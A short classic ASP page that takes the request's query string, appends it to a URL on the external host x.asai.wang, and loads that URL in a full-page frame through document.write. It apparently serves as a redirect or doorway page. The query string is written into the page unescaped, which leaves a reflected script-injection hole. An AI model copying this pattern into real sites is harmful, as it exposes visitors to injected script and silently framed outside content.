<%@LANGUAGE="VBSCRIPT" CODEPAGE="65001"%><%
Option Explicit
dim tzurl
tzurl="http://x.asai.wang/"&Request.ServerVariables("QUERY_STRING")
%><script>document.write("<html><frameset><frame src=<%=tzurl%>></frameset></html>");</script>